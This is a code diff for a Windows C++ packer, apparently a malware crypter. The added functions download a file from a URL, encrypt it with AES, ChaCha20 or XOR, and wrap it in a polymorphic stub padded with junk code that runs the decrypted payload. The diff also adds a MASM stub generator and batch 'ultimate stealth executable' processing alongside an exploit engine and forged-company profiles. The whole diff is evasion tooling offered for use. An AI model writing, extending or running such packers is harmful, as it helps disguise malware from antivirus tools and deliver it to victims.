@@ -36,6 +36,9 @@
 #include "tiny_loader.h"
 #include "cross_platform_encryption.h"
 #include "enhanced_loader_utils.h"
+#include "url_services.h"
+#include "polymorphic_engine.h"
+#include "masm_generator.h"
 
 #pragma comment(lib, "ole32.lib")
 #pragma comment(lib, "crypt32.lib")
@@ -1568,6 +1571,9 @@ public:
     PEEmbedder peEmbedder;
     AdvancedExploitEngine exploitEngine;
     EmbeddedCompiler embeddedCompiler;
+    URLServices urlServices;
+    PolymorphicEngine polymorphicEngine;
+    MASMGenerator masmGenerator;
 
     struct CompanyProfile {
         std::string name;
@@ -2136,6 +2142,122 @@ public:
         }
     }
 
+    // URL Download and Pack Services
+    bool urlPackFile(const std::string& url, const std::string& outputPath, 
+                     int encType = 1) {
+        std::cout << "Downloading file from: " << url << std::endl;
+        
+        std::vector<uint8_t> fileData;
+        if (!urlServices.downloadFile(url, fileData)) {
+            std::cout << "Error: Failed to download file from URL" << std::endl;
+            return false;
+        }
+        
+        std::cout << "Downloaded " << fileData.size() << " bytes" << std::endl;
+        
+        // Generate encryption keys
+        CrossPlatformEncryption encryption;
+        
+        // Apply encryption
+        std::vector<uint8_t> encryptedData;
+        switch (encType) {
+            case 1: // AES
+                encryptedData = encryption.encrypt(fileData, CrossPlatformEncryption::Method::AES);
+                break;
+            case 2: // CHACHA20
+                encryptedData = encryption.encrypt(fileData, CrossPlatformEncryption::Method::CHACHA20);
+                break;
+            default: // XOR
+                encryptedData = encryption.encrypt(fileData, CrossPlatformEncryption::Method::XOR);
+                break;
+        }
+        
+        // Generate polymorphic packed executable
+        std::string packedCode = generatePolymorphicPacker(encryptedData, encryption, encType);
+        
+        // Save packed code
+        std::ofstream outFile(outputPath + ".cpp");
+        if (!outFile) {
+            std::cout << "Error: Cannot create output file" << std::endl;
+            return false;
+        }
+        
+        outFile << packedCode;
+        outFile.close();
+        
+        std::cout << "URL Pack completed! Output: " << outputPath << ".cpp" << std::endl;
+        return true;
+    }
+
+    // Generate MASM Assembly Stub
+    bool generateMASMStub(const std::string& targetFile, const std::string& outputPath,
+                          bool usePolymorphic = true) {
+        // Generate random key
+        std::vector<uint8_t> key(32);
+        for (auto& byte : key) {
+            byte = randomEngine.generateRandomBytes(1)[0];
+        }
+        
+        // Generate MASM stub
+        std::string masmCode = masmGenerator.generateRuntimeStub(targetFile, key, usePolymorphic);
+        
+        // Save MASM file
+        std::ofstream outFile(outputPath);
+        if (!outFile) {
+            std::cout << "Error: Cannot create MASM output file" << std::endl;
+            return false;
+        }
+        
+        outFile << masmCode;
+        outFile.close();
+        
+        std::cout << "MASM stub generated! Output: " << outputPath << std::endl;
+        std::cout << "Compile with: ml /c /coff " << outputPath << std::endl;
+        return true;
+    }
+
+private:
+    // Generate polymorphic packer code
+    std::string generatePolymorphicPacker(const std::vector<uint8_t>& encryptedData,
+                                          CrossPlatformEncryption& encryption,
+                                          int encType) {
+        // Generate unique names using polymorphic engine
+        std::string payloadVar = polymorphicEngine.generateVarName();
+        std::string keyVar = polymorphicEngine.generateVarName();
+        std::string decryptFunc = polymorphicEngine.generateFuncName();
+        std::string mainFunc = polymorphicEngine.generateFuncName();
+        
+        std::stringstream code;
+        
+        // Add polymorphic includes
+        code << polymorphicEngine.generatePolymorphicIncludes();
+        code << "#include <fstream>\n";
+        code << "#include <cstring>\n";
+        code << "#ifdef _WIN32\n#include <windows.h>\n#else\n#include <unistd.h>\n#endif\n\n";
+        
+        // Generate decryption stub
+        code << encryption.generateDecryptionStub(
+            encType == 1 ? CrossPlatformEncryption::Method::AES :
+            encType == 2 ? CrossPlatformEncryption::Method::CHACHA20 :
+            CrossPlatformEncryption::Method::XOR,
+            encryptedData
+        );
+        
+        // Add polymorphic junk
+        code << polymorphicEngine.generateJunkCode(10);
+        
+        // Main function with polymorphic structure
+        code << "\nint main() {\n";
+        code << polymorphicEngine.generateJunkCode(5);
+        code << "    executeDecryptedPayload();\n";
+        code << polymorphicEngine.generateJunkCode(5);
+        code << "    return 0;\n";
+        code << "}\n";
+        
+        return code.str();
+    }
+
+public:
     // NEW: Create Ultimate Stealth Executable with Exploit Integration
     bool createUltimateStealthExecutableWithExploits(const std::string& inputPath, const std::string& outputPath,
         int companyIndex, int certIndex,
@@ -3087,12 +3209,59 @@ static LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM l
 
     case WM_DROPFILES: {
         HDROP hDrop = (HDROP)wParam;
-        wchar_t droppedFile[MAX_PATH] = { 0 };
-
-        if (DragQueryFileW(hDrop, 0, droppedFile, MAX_PATH)) {
-            SetWindowTextW(g_hInputPath, droppedFile);
+        UINT fileCount = DragQueryFileW(hDrop, 0xFFFFFFFF, NULL, 0);
+        
+        if (fileCount == 1) {
+            // Single file - set as input
+            wchar_t droppedFile[MAX_PATH] = { 0 };
+            if (DragQueryFileW(hDrop, 0, droppedFile, MAX_PATH)) {
+                SetWindowTextW(g_hInputPath, droppedFile);
+            }
         }
-        (void)droppedFile; // Suppress unused variable warning
+        else if (fileCount > 1) {
+            // Multiple files - process all
+            int result = MessageBoxW(hwnd, 
+                L"Multiple files detected. Process all files?", 
+                L"Multiple Files", 
+                MB_YESNO | MB_ICONQUESTION);
+                
+            if (result == IDYES) {
+                // Process multiple files in a separate thread
+                std::vector<std::wstring>* files = new std::vector<std::wstring>();
+                
+                for (UINT i = 0; i < fileCount; i++) {
+                    wchar_t droppedFile[MAX_PATH] = { 0 };
+                    if (DragQueryFileW(hDrop, i, droppedFile, MAX_PATH)) {
+                        files->push_back(droppedFile);
+                    }
+                }
+                
+                // Process files in background thread
+                std::thread([files]() {
+                    for (const auto& file : *files) {
+                        std::string inputFile = wstringToString(file);
+                        std::string outputFile = inputFile + "_packed.exe";
+                        
+                        // Update status
+                        std::wstring status = L"Processing: " + file;
+                        SetWindowTextW(g_hStatusText, status.c_str());
+                        
+                        // Process the file
+                        bool success = g_packer.createUltimateStealthExecutable(
+                            inputFile, outputFile, 0, 0, 
+                            MultiArchitectureSupport::Architecture::x64);
+                            
+                        if (!success) {
+                            std::wstring errorMsg = L"Failed to process: " + file;
+                            SetWindowTextW(g_hStatusText, errorMsg.c_str());
+                        }
+                    }
+                    
+                    SetWindowTextW(g_hStatusText, L"Batch processing completed!");
+                    delete files;
+                }).detach();
+            }
+        }
 
         DragFinish(hDrop);
         break;
